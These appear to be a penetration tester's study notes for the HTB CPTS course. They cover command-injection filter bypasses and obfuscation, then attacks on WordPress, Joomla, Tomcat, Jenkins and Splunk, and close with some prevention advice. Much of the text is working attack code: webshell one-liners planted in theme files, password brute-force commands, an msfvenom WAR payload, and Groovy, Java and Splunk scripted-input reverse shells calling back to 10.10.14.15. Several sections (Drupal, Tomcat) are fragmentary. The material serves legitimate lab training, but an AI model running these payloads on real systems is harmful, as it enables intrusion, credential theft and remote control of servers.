3. Enable Intercept in the Proxy tab
4. Submit a normal request (e.g., 127.0.0.1)
5. Request appears in Burp — send to Repeater (Ctrl+R)
6. Modify the ip parameter to your payload
7. URL-encode the payload (Ctrl+U in Repeater)
8. Click Send

OWASP ZAP

Open-source alternative to Burp Suite with similar proxy interception capabilities. Good for automated scanning too.

Detecting front-end vs. back-end validation:
- Open Firefox DevTools → Network tab (Ctrl+Shift+E)
- Submit the malicious payload
- No network request appears → Validation is front-end only (easily bypassed)
- Network request appears with error response → Back-end validation (requires bypass techniques)

URL-Encoding Payloads in Burp

Original:  127.0.0.1; whoami
URL-encoded in Burp: ip=127.0.0.1%3b+whoami

In Burp Repeater:
- Select your payload text → Ctrl+U to URL-encode
- Then click Send

Successful response: You'll see both the ping output AND the whoami result in the response body.

Identifying Filters

Back-end filters work by checking input against a blacklist of characters or words and rejecting any request containing them.

How to Identify a WAF vs. Application Filter

Response Type Likely Source
Error shown in the app's output area PHP/Application-level filter
Separate error page with your IP and request details WAF (Web Application Firewall)

Tools That Use Filtering

Web Application Firewalls (WAFs)

  • ModSecurity — Apache/Nginx built-in WAF module
  • Cloudflare WAF — Cloud-based, broad signature detection
  • Fortinet WAF — Enterprise hardware/software WAF
  • Imperva — Enterprise WAF with behavior analysis

Identifying Which Character Is Blacklisted

Methodology — Binary search approach:

Start: 127.0.0.1; whoami  → BLOCKED

Test 1: 127.0.0.1;         → BLOCKED  ← semicolon is blacklisted
Test 2: 127.0.0.1%0a       → ALLOWED  ← newline works!
Test 3: 127.0.0.1%0a whoami → BLOCKED  ← space is blacklisted
Test 4: 127.0.0.1%0a%09whoami → ALLOWED ← tab works!

What you're doing: Stripping the payload down to one character at a time until you isolate what triggers the block. Then you find alternatives for each blocked character.

Example PHP Blacklist Code (What You're Up Against)

$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}

Why this approach is weak: It only checks for exact characters. If you find a character that achieves the same effect but isn't in the list (like \n), you bypass the filter entirely.

Bypassing Space Filters

Spaces are commonly blacklisted because legitimate inputs (like IP addresses) never contain them.

Method 1 — Using Tabs %09

# Instead of: 127.0.0.1\n whoami
# Use:
127.0.0.1%0a%09whoami

# Full command executed:
ping -c 1 127.0.0.1
whoami

Why it works: Bash and Windows CMD/PowerShell both treat tabs as valid argument separators, identical to spaces in most command contexts.

Method 2 — Using $IFS (Linux Only)

# $IFS = Internal Field Separator
# Default value contains space AND tab characters
127.0.0.1%0a${IFS}whoami

# Bash replaces ${IFS} with a space at execution time

Why it works: $IFS is a shell environment variable whose default value IS a space/tab. When the shell expands it, it becomes the space character — but the literal string ${IFS} never triggers a space filter.

Limitation: Cannot be used inside sub-shells ($()) because the variable expansion doesn't work the same way there.

Method 3 — Brace Expansion (Linux Only)

# Bash brace expansion automatically adds spaces between comma-separated items
{ls,-la}

# Output is identical to:
ls -la

Usage in injection:

127.0.0.1%0a{ls,-la}
# Executes: ping -c 1 127.0.0.1 then ls -la

Why it works: Bash interprets {cmd,arg} by expanding it with spaces — but the input never contained a literal space character.

Reference: PayloadsAllTheThings — Writing Commands Without Spaces

Bypassing Other Blacklisted Characters

Bypassing Slash / on Linux

The / character is essential for specifying paths (e.g., /etc/passwd) and is often blacklisted.

Technique — Extract from environment variables:

# View the PATH variable to find a slash:
echo ${PATH}
# Output: /usr/local/bin:/usr/bin:/bin:/usr/games

# Extract first character (index 0, length 1):
echo ${PATH:0:1}
# Output: /

Syntax: ${VARIABLE:START_INDEX:LENGTH}
- ${PATH:0:1} → start at position 0, take 1 character = /

Usage in injection:

# Instead of: cat /etc/passwd
# Use:
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

Finding more characters from environment variables:

printenv
# Lists ALL environment variables — scan for ones containing useful characters
# like ;  \  :  @  etc.

printenv command: Prints all current shell environment variables and their values. Use this to discover which variables contain characters you need to bypass filters.

Bypassing Semicolon ; on Linux

# Find semicolon in LS_COLORS variable:
echo ${LS_COLORS:10:1}
# Output: ;

# Usage:
127.0.0.1${LS_COLORS:10:1}${IFS}whoami

What's happening: $LS_COLORS is a variable containing color codes for ls output. At position 10, there happens to be a ; character. We extract just that one character.

Character Shifting (Linux)

# Shift any character forward by 1 in ASCII
# [ is ASCII 91, \ is ASCII 92 → shifting [ gives \
echo $(tr '!-}' '"-~'<<<[)
# Output: \

# Find ASCII values:
man ascii

How to use it:
1. Find the character before your target in the ASCII table (using man ascii)
2. Use the tr command to shift it forward by 1
3. tr '!-}' '"-~' shifts the entire printable ASCII range by 1 position

Example: Need ; (ASCII 58)? Use : (ASCII 58-1=57) and shift it.

Bypassing Slash \ on Windows CMD

rem %HOMEPATH% = \Users\htb-student
rem ~6 = start at position 6 = \htb-student
rem -11 = remove last 11 chars (length of "htb-student") = \

echo %HOMEPATH:~6,-11%
rem Output: \

Bypassing Slash \ on Windows PowerShell

# Words are arrays in PowerShell — index directly
$env:HOMEPATH[0]
# Output: \

$env:PROGRAMFILES[10]
# Output: \

Viewing all Windows environment variables:

# PowerShell
Get-ChildItem Env:

# CMD
set

Bypassing Blacklisted Commands

Even after bypassing character filters, the command itself (like whoami, cat, id) may be blacklisted.

How Command Blacklists Work (PHP Example)

$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos('$_POST[\'ip\']', $word) !== false) {
        echo "Invalid input";
    }
}

The weakness: This looks for an exact string match. If we change the appearance of the command so it doesn't match the blacklisted string exactly, we bypass it — while the shell still executes the intended command.

Bypass Method 1 — Quote Insertion (Linux & Windows)

Insert quotes within the command name. The shell strips them before execution.

# Single quotes:
w'h'o'am'i
# Shell executes: whoami ✓

# Double quotes:
w"h"o"am"i
# Shell executes: whoami ✓

Rules:
- You cannot mix single and double quotes in the same command
- The total number of quotes must be even
- Works on both Linux and Windows

In payload:

127.0.0.1%0aw'h'o'am'i

Bypass Method 2 — Backslash & $@ (Linux Only)

# Backslash — ignored by bash between command characters:
w\ho\am\i
# Executes: whoami ✓

# $@ — expands to nothing (or script arguments) between chars:
who$@ami
# Executes: whoami ✓

Advantage over quotes: No requirement for even number — you can insert just one.

Bypass Method 3 — Caret ^ (Windows CMD Only)

who^ami
rem Executes: whoami ✓

Advanced Command Obfuscation

Used against WAFs and advanced filtering that basic techniques can't bypass.

Technique 1 — Case Manipulation

Windows (CMD & PowerShell — case-insensitive):

WhOaMi
WHOAMI
wHoAmI
# All execute: whoami ✓

Linux (case-sensitive — requires conversion):

# tr: translate/replace characters
# "[A-Z]" → "[a-z]" converts all uppercase to lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
# Shell executes the result: whoami ✓

# Alternative using printf and parameter expansion:
$(a="WhOaMi";printf %s "${a,,}")
# ${a,,} = lowercase all characters in variable $a
# Executes: whoami ✓

Important: If spaces are filtered, replace with %09:

$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

Technique 2 — Reversed Commands

⚡ Why use it The command never appears in its recognizable form in the payload.

Linux:

# Step 1 — Generate the reversed string:
echo 'whoami' | rev
# Output: imaohw

# Step 2 — Execute by reversing it back in a sub-shell:
$(rev<<<'imaohw')
# <<< = "here string" — feeds the string as stdin to rev
# rev reverses it back to "whoami" → shell executes it ✓

Windows PowerShell:

# Step 1 — Reverse the string:
"whoami"[-1..-20] -join ''
# [-1..-20] = array slice from last to first = reversal
# Output: imaohw

# Step 2 — Execute:
iex "$('imaohw'[-1..-20] -join '')"
# iex = Invoke-Expression = executes the string as a command
# Output: your username ✓

Tip: If you also need to bypass character filters, reverse those characters too and include them in the reversed payload.

Technique 3 — Encoded Commands

Best used when: Your payload contains filtered characters that can't be individually bypassed, or when characters get mangled by URL decoding before reaching the shell.

Linux — Base64 Encoding:

# Step 1 — Encode your intended command:
echo -n 'cat /etc/passwd | grep 33' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Step 2 — Decode and execute in a sub-shell:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

Breaking down the command:
- base64 -d — decode from base64
- <<< — "here string" (passes a string as stdin, avoids using | pipe which may be filtered)
- $() — sub-shell (executes the decoded string)
- bash<<< — passes the decoded command string to bash for execution

Why avoid |? The pipe character is commonly filtered. <<< achieves the same result without needing it.

Injected payload (after replacing spaces with %09):

127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

If bash or base64 are also filtered:
- Replace bash with sh
- Replace base64 with openssl enc -base64 -d or openssl base64 -d
- Use xxd for hex encoding instead

Windows — Base64 Encoding:

# Step 1 — Encode (PowerShell):
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA
# Note: Windows uses UTF-16LE encoding, not UTF-8

# From Linux (to generate Windows-compatible base64):
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# Output: dwBoAG8AYQBtAGkA

# Step 2 — Decode and execute (PowerShell):
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

iex (Invoke-Expression): PowerShell cmdlet that evaluates and executes a string as a command. Equivalent to eval() in other languages.

Key insight: Windows uses UTF-16LE encoding for strings, so you must convert before base64-encoding if generating the payload on Linux.

Evasion Tools

When manual techniques aren't enough — typically against enterprise WAFs with behavioral analysis.

Bashfuscator (Linux)

What it does: Automatically obfuscates Bash commands using multiple randomized techniques (token manipulation, encoding, reversal, etc.). Produces commands that look completely unrecognizable while executing identically.

GitHub: https://github.com/Bashfuscator/Bashfuscator

Installation:

git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

Basic usage:

cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
# Warning: May produce 100–1,000,000+ character payload (random technique)

Controlled usage (shorter, simpler output):

./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# -s 1     = simplest obfuscation
# -t 1     = one technique
# --no-mangling = no character mangling (keeps it shorter)
# --layers 1    = single obfuscation layer

Verify the obfuscated payload works:

bash -c '<OBFUSCATED_PAYLOAD_HERE>'
# Should output the same result as: cat /etc/passwd

DOSfuscation (Windows)

What it does: Interactive PowerShell tool that obfuscates Windows CMD commands using environment variable manipulation, encoding, and binary syntax. Created by Daniel Bohannon.

GitHub: https://github.com/danielbohannon/Invoke-DOSfuscation

Installation & Launch:

git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

Usage:

Invoke-DOSfuscation> SET COMMAND type C:\Users\htbstudent\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

Result example:

typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%bstu%SystemRoot:~-4,-3%ent\Desktop\flag.txt

Tip: Can be run on Linux via pwsh (PowerShell for Linux) — available by default in Pwnbox.

Related resource: Secure Coding 101: JavaScript module covers advanced obfuscations for various attack types.

Command Injection Prevention

1. Avoid System Command Functions

Best practice: Use built-in language functions instead of shell commands.

// INSTEAD OF:
system("ping -c 1 " . $ip);

// USE:
// PHP's fsockopen to check if a host is reachable — no shell involved
$fp = fsockopen($ip, 80, $errno, $errstr, 5);

Rationale: Built-in functions are implemented securely within the language runtime and don't spawn shell processes that can be hijacked.

2. Input Validation (Front-End AND Back-End)

Critical: Front-end validation alone is never sufficient. Always validate on the back-end.

PHP — Built-in IP validation:

if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // Input is a valid IP — proceed
} else {
    // Reject the request
}

PHP — Custom regex validation:

// Validates IPv4 format strictly
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $_GET['ip'])) {
    // Valid format
}

JavaScript/NodeJS — Regex validation:

if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // Valid IP
} else {
    // Deny
}

NodeJS — Library-based validation:

// Install: npm install is-ip
const isIp = require('is-ip');
if (isIp(ip)) { /* proceed */ }

3. Input Sanitization

After validation, strip any remaining dangerous characters.

PHP:

// Only allow alphanumerics and dots (for IPs)
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);

JavaScript:

var ip = ip.replace(/[^A-Za-z0-9.]/g, '');

NodeJS with DOMPurify:

import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);

Warning: escapeshellcmd() in PHP (or escape() in NodeJS) is generally not a secure solution — it can be bypassed. Prefer allowlist-based sanitization (only permit known-good characters).

4. Server Configuration (Defense in Depth)

Configuration Purpose
WAF (ModSecurity, Cloudflare, Fortinet, Imperva) Broad attack detection and blocking at the network/application layer
Principle of Least Privilege Run web server as low-privilege user (e.g., www-data) — limits damage if compromised
Disable dangerous functions PHP: disable_functions=system,exec,shell_exec,passthru,popen
Restrict filesystem scope PHP: open_basedir = '/var/www/html' — prevents reading outside webroot
Reject double-encoded requests Prevents %2527 (double-encoded ') type bypasses
Block non-ASCII in URLs Stops some encoding-based bypass attempts
Avoid outdated modules e.g., PHP CGI mode is historically vulnerable

Operator URL-Encoded Effect

& %26 Run both (second first)
\| %7c Both run, only second shown
&& %26%26 Second only if first succeeds
\|\| %7c%7c Second only if first fails
`` %60%60 Both run (Linux only)
$() %24%28%29 Both run (Linux only)

Skills Assessment Notes

Scenario: File manager web application — file managers often execute system commands.

Approach:
1. Identify all user-input points in the file manager
2. Test each with basic operators (;, \n, &&, ||)
3. If filtered → identify which characters/commands are blocked
4. Apply space bypass techniques
5. Apply command obfuscation techniques
6. Use encoded commands if filters are extensive
7. Fall back to Bashfuscator for WAF evasion

Principle of Least Privilege reminder: The server runs as www-data — exploitation gives you www-data level access, not root. Post-exploitation would require privilege escalation.

Notes created for CPTS exam prep — HTB Penetration Tester path
Module: 22 — Command Injections

Web Applications/Module 24

Attacking Common Applications

1. Introduction & Application Categories

Web applications are interactive apps accessed via browsers. They follow a client-server architecture — the front-end runs in the browser, the back-end runs on a server. All common apps can suffer from the OWASP Top 10 vulnerability categories.

📊 Industry Data (2021 Barracuda Survey): 72% of organizations suffered at least one breach from an application vulnerability.

Common Application Categories

Category Examples
Web Content Management (CMS) WordPress, Joomla, Drupal, DotNetNuke
Application Servers Apache Tomcat, Oracle WebLogic, IBM WebSphere
SIEM Splunk, LogRhythm
Network Management PRTG Network Monitor, ManageEngine OpManager
IT Management Nagios, Puppet, Zabbix
Software Dev Tools Jenkins, Confluence, phpMyAdmin
Customer Service osTicket, Zendesk
Source Code / Git GitLab, GitHub, Bitbucket
Search Engines Elasticsearch, Apache Solr
Enterprise Integration Apache ActiveMQ, Oracle Fusion Middleware

Quick Application Summary

App Language Backend Notes
WordPress PHP MySQL Most popular CMS, ~32.5% of all websites
Drupal PHP MySQL/PostgreSQL/SQLite 56% of government websites
Joomla PHP MySQL Third most popular CMS
Tomcat Java — Runs Java Servlets and JSP
Jenkins Java — CI/CD automation, runs inside Tomcat
Splunk — — Log analytics / SIEM
PRTG Delphi — Agentless network monitor
osTicket PHP MySQL Open-source ticketing system
GitLab Ruby/Go/Vue.js — Self-hosted Git repository platform

2. Application Discovery & Enumeration

Setting Up /etc/hosts for Lab Environments

When HTB modules use virtual hosts (vhosts), you need to add them manually:

# Quick method — add multiple vhosts at once
IP=10.129.42.195
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts

# Or open and edit manually:
sudo vim /etc/hosts

Why: The lab uses vhosts to simulate a realistic network. Without these entries, your browser and tools won't resolve the hostnames to the correct IP, and you'll get connection errors.

Nmap Web Discovery Scan

sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

Breakdown:
- -p 80,443,8000,8080,8180,8888,10000 — Common web application ports. Tomcat runs on 8080/8180, Splunk on 8000, etc.
- --open — Only show hosts with open ports (reduces noise)
- -oA web_discovery — Save output in all formats (.nmap, .xml, .gnmap). The XML will be used by screenshot tools
- -iL scope_list — Read targets from a file instead of specifying them on the command line

What to look for in results:
- Port 8080/8180 → likely Tomcat or Jenkins
- Port 8000/8089 → likely Splunk
- Port 8080 with Paessler mention → PRTG
- Windows ports (135, 445, 3389) → Windows host, adjust attack approach
- dev in hostname → development environment, often less hardened

➜ Next step Feed the XML output into EyeWitness or Aquatone for visual screenshots.

EyeWitness — Screenshot Web Applications

Tool: EyeWitness takes Nmap/Nessus XML and screenshots every discovered web app, categorizes them, fingerprints them, and suggests default credentials.

# Install
sudo apt install eyewitness

# Run against Nmap XML output
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

Breakdown:
- --web — Use the HTTP screenshot mode (Selenium-based)
- -x web_discovery.xml — Input file: the Nmap XML scan you ran earlier
- -d inlanefreight_eyewitness — Output directory name (will be created)

What to do with results:
- Open the HTML report in a browser
- Go to "High Value Targets" first — EyeWitness categorizes by risk
- Note down any Tomcat instances (try /manager with default creds immediately)
- Note dev subdomains — often running unfinished/debug code
- Note unfamiliar apps — research them, look for default creds

💡 EyeWitness also works with Nessus XML files.

Aquatone — Alternative Screenshot Tool

Tool: Similar to EyeWitness. Can also take Masscan XML as input.

# Download and extract
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip

# Run against Nmap XML
cat web_discovery.xml | ./aquatone -nmap

Breakdown:
- cat web_discovery.xml | — Pipe the Nmap XML into Aquatone via stdin
- ./aquatone -nmap — The -nmap flag tells Aquatone the input is Nmap XML format (not plain text URLs)

Output: Creates aquatone_report.html in the current directory.

Note-Taking Structure (Recommended)

External Penetration Test - <Client Name>
├── Scope (IPs, URLs, fragile hosts, time constraints)
├── Client Points of Contact
├── Credentials
├── Discovery/Enumeration
│   ├── Scans
│   ├── Live Hosts
│   └── Application Discovery
│       ├── Scans
│       └── Interesting/Notable Hosts
├── Exploitation
│   └── <Hostname or IP>
└── Post-Exploitation
    └── <Hostname or IP>

💡 Timestamp every scan. Save exact scan syntax and targeted hosts. This protects you if a client questions activity.

3. WordPress

Overview

  • Written in PHP, runs on Apache, uses MySQL backend
  • ~32.5% of all websites use WordPress
  • 89% of known vulnerabilities are in plugins, 7% themes, 4% core
  • Common ports: 80 (HTTP), 443 (HTTPS)
  • Key paths: /wp-admin/, /wp-login.php, /wp-content/plugins/, /wp-content/themes/

WordPress User Roles

Role Access
Administrator Full control — add/delete users/posts, edit source code
Editor Publish and manage all posts
Author Manage own posts only
Contributor Write posts but cannot publish
Subscriber Browse posts only

🎯 Goal: Get Administrator access → RCE via Theme Editor.

Discovery & Footprinting

Check robots.txt:

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/
Sitemap: https://inlanefreight.local/wp-sitemap.xml

Presence of /wp-admin/ or /wp-content/ = WordPress confirmed.

Fingerprint version with curl:

# Find WordPress version in page source
curl -s http://blog.inlanefreight.local | grep WordPress
# Expected output: <meta name="generator" content="WordPress 5.8" />

# Find active theme
curl -s http://blog.inlanefreight.local/ | grep themes

# Find installed plugins
curl -s http://blog.inlanefreight.local/ | grep plugins

Why use curl with grep: Faster than opening browser devtools. The version is embedded in the HTML meta tag. Plugins and themes reference /wp-content/plugins/ and /wp-content/themes/ in script/stylesheet links.

Automated Enumeration with WPScan

Tool: WPScan is a WordPress-specific vulnerability scanner. Free API tokens available at https://wpvulndb.com/users/sign_up (75 requests/day).

# Install (or use pre-installed version)
sudo gem install wpscan

# Full enumeration scan
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token YOUR_TOKEN

What --enumerate discovers:
- WordPress core version + known CVEs
- Installed themes and versions
- Installed plugins and known vulnerabilities
- Usernames (via author pages, RSS feeds, brute force)
- Directory listing status
- XML-RPC status

Key findings to look for:
- [!] markers = vulnerabilities found
- XML-RPC seems to be enabled = can use for faster password attacks
- User accounts (needed for brute force)
- Plugin vulnerabilities with PoC links

WordPress Login Brute Force

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

Breakdown:
- --password-attack xmlrpc — Uses the XML-RPC API endpoint (/xmlrpc.php) instead of the login form. Much faster because XML-RPC allows batching multiple login attempts per request
- -t 20 — 20 concurrent threads
- -U john — Target username (can also be a file: -U users.txt)
- -P /usr/share/wordlists/rockyou.txt — Password list

Why xmlrpc over wp-login: The XML-RPC method is significantly faster and less likely to trigger lockouts since it uses the API. The wp-login method attacks the visible login form.

After getting creds: Login to /wp-login.php, go to Appearance → Theme Editor.

WordPress RCE via Theme Editor

Steps:
1. Login as admin at /wp-login.php
2. Navigate: Appearance → Theme Editor
3. Select an inactive theme (e.g., Twenty Nineteen) to avoid breaking the live site
4. Click on 404.php in the file list
5. Add this one-liner just below the PHP comments:

system($_GET[0]);
  1. Click Update File
  2. Access the webshell:
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)

Why: WordPress themes are editable PHP files. Adding system() creates a webshell. The $_GET[0] takes the URL parameter 0 as the command to run.

Upgrade to reverse shell: Replace the curl command with a bash reverse shell payload in the 0 parameter.

Cleanup: Remove the system() line from 404.php and document the artifact in your report.

WordPress RCE via Metasploit

use exploit/unix/webapp/wp_admin_shell_upload
set rhosts blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
exploit

What it does: Uploads a malicious PHP plugin to /wp-content/plugins/, activates it to execute a PHP Meterpreter reverse shell, then cleans up.

⚠️ Always set both RHOSTS (IP) and VHOST (hostname) for vhost environments, otherwise the exploit fails with "not using WordPress" error.

Vulnerable Plugin: mail-masta (LFI)

Plugin version 1.0.0 — allows unauthenticated Local File Inclusion via unsanitized pl parameter.

# Read /etc/passwd via LFI
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

Why it works: The plugin code does include($_GET['pl']) without any validation — you can include any file the web server can read.

Vulnerable Plugin: wpDiscuz (Unauthenticated RCE)

Plugin version 7.0.4 — CVE-2020-24186 — bypasses MIME type checks to allow unauthenticated PHP file upload.

python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
# After upload, execute commands via curl:
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/SHELL_NAME.php?cmd=id"

Why curl works: The exploit script uploads the webshell but the built-in execution fails. Manually calling the uploaded file with ?cmd=id runs commands via system().

Overview

  • Admin panel at /administrator/index.php
  • Over 7,000 extensions, 1,000+ templates
  • Default admin username: admin

Discovery & Footprinting

# Check meta generator tag
curl -s http://dev.inlanefreight.local/ | grep Joomla

# Check README for version
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

# Check manifest file for exact version

robots.txt indicators for Joomla:

Disallow: /administrator/
Disallow: /bin/
Disallow: /components/
Disallow: /modules/
Disallow: /plugins/

Enumeration with Droopescan

Tool: Droopescan — plugin-based scanner for multiple CMS types.

# Install
sudo pip3 install droopescan

# Scan a Joomla site
droopescan scan joomla --url http://dev.inlanefreight.local/

What it finds: Possible version range, interesting URLs (admin login, license file), version-specific files.

Joomla Login Brute Force

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

Breakdown:
- -u — Target URL
- -w — Password wordlist
- -usr admin — Username (can be a file for multiple usernames)

Common default credentials to try first: admin:admin, admin:password, admin:joomla

Joomla RCE via Template Editor

Once you have admin credentials (admin:admin):

  1. Login at http://dev.inlanefreight.local/administrator
  2. Navigate: Extensions → Templates → Templates
  3. Click on a template (e.g., protostar)
  4. Click on error.php
  5. Add the webshell:
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
  1. Click Save & Close
  2. Execute via curl:
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)

Why use an md5-looking parameter name instead of cmd: Reduces risk of a "drive-by" attacker finding your webshell during the assessment. Standard parameter names like cmd are widely known and scanned for.

Joomla Known Vulnerability (CVE-2019-10945)

Affects: Joomla 1.5.0 through 3.9.4 — Authenticated Directory Traversal and File Deletion

python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /

Overview

  • ~950,000 active instances

Discovery & Footprinting

# Confirm Drupal via meta tag

Enumeration with Droopescan

  1. Login as admin

  3. Navigate: Content → Add content → Basic page

?>

CVE-2014-3704 — Drupalgeddon (SQL Injection → Admin Account Creation)

Affects: Drupal 7.0 – 7.31

Overview

  • Common ports: 8080 (HTTP), 8009 (AJP), 8443 (HTTPS)
  • Admin panels: /manager/html and /host-manager

Key Directory Structure

/opt/tomcat/
├── bin/         # Startup scripts
├── conf/

│   └── web.xml

│   └── ROOT/

Discovery & Footprinting

# Check /docs page for version

# Check for AJP service (Ghostcat indicator)

Gobuster to find manager path:

gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
🔍 What you're looking for /manager (returns 302 = exists), /host-manager

Tomcat Manager Brute Force

Method 1: Metasploit

Common default creds: tomcat:tomcat, tomcat:admin, admin:admin, admin:manager

Tomcat WAR File Upload → RCE

Once you have manager credentials:

Step 1: Download a JSP webshell

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

Step 2: Or generate a malicious WAR with msfvenom

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Breakdown:
- -p java/jsp_shell_reverse_tcp — Java JSP reverse shell payload
- LHOST — Your IP (attacker machine)

Step 3: Upload via Manager

Browse to http://web01.inlanefreight.local:8180/manager/html → Deploy section → Browse → select backup.war → Deploy

Step 4: Execute

# For cmd.jsp webshell:

CVE-2020-1938 — Ghostcat (Unauthenticated LFI via AJP)

Affects: All Tomcat versions before 9.0.31, 8.5.51, 7.0.100

# Confirm AJP port is open

# Exploit — read web.xml

What it does: The AJP (Apache JServ Protocol) connector doesn't properly validate file requests, allowing you to read any file within the web application's directory — including WEB-INF/web.xml which may contain credentials.

7. Jenkins

Overview

  • Java-based CI/CD automation server
  • Runs on Tomcat, default port 8080 (master), port 5000 (agent communication)
  • Often runs as root or NT AUTHORITY\SYSTEM — very high-value target!
  • Key attack surface: Script Console at /script

Discovery & Enumeration

Jenkins is identified by its distinctive login page. No specific fingerprinting command needed — just browse to the host on port 8080.

Common misconfigurations:
- Weak/default credentials (admin:admin, admin:password)
- No authentication configured at all (common on internal networks)
- Anonymous users with build privileges

Jenkins Script Console RCE

Once logged in as admin, navigate to: Manage Jenkins → Script Console (or directly: http://jenkins.inlanefreight.local:8000/script)

Linux reverse shell via Groovy:

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

Why Groovy: Jenkins uses Apache Groovy for its script console. Groovy runs on the JVM and can execute OS-level commands via Runtime.getRuntime().exec(). This effectively gives you a reverse shell with whatever privileges Jenkins is running under (often root/SYSTEM).

Set up listener first:

nc -lvnp 8443

Windows command execution via Groovy:

def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

Windows reverse shell via Groovy:

String host="10.10.14.15";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

8. Splunk

Overview

  • Log analytics platform, often used as SIEM
  • Default port: 8000 (web UI), 8089 (REST API / management)
  • Default credentials (old versions): admin:changeme
  • Trial version converts to Free version (no auth!) after 60 days — common in corporate environments!
  • Often runs as root or SYSTEM

Discovery

sudo nmap -sV 10.129.201.50
# Look for: Splunkd httpd on 8000 and 8089

EyeWitness often identifies Splunk and lists default credentials in its report.

Attacking Splunk via Custom App (Scripted Input)

Concept: Splunk allows admins to install custom applications with "scripted inputs" — scripts that run periodically to feed data. We abuse this to get a reverse shell.

Directory structure for the malicious app:

splunk_shell/
├── bin/
│   ├── rev.py       (Python reverse shell for Linux)
│   ├── run.bat      (Batch launcher for Windows)
│   └── run.ps1      (PowerShell reverse shell for Windows)
└── default/
    └── inputs.conf  (Tells Splunk to run our scripts)

inputs.conf:

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\\bin\\run.bat]
disabled = 0
sourcetype = shell
interval = 10

Why interval = 10: Splunk runs the script every 10 seconds, so your reverse shell connects back within 10 seconds of deploying the app.

run.bat (Windows):

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

rev.py (Linux):

import sys,socket,os,pty
ip="10.10.14.15"
port="443"
